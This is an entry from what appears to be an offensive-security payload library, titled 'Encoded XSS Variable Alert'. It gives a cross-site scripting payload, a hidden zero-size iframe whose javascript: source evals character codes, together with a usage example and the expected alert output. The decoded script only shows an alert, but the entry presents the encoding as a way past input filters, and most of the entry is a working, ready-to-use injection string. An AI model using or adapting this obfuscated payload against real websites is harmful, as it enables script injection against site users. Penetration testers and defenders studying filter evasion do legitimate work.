---
data: >-
  <iframe
  src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59]))
  width=0 height=0 style=display:none;></iframe>
tags:
  - xss
  - encoded
type: command
executor: html
platforms:
  - Web
id: c3abb9d7-ba21-457a-bee0-59db32753b6c
created_at: '2025-12-14T00:11:16.585Z'
updated_at: '2025-12-14T00:11:16.585Z'
verified: false
validated: true
submitted: true
---
# Encoded XSS Variable Alert

## Command

```html
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```

## Description

Encoded payload to set a variable and alert it, bypassing space restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `src` | Evaluates char codes to run 'let test =123; alert(test);' | Yes |

## Examples

### Basic Usage

```html
Test<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```

## Expected Output

Alert box with '123'

## Related

- [[procedures/Craft-Encoded-XSS-Payload]]
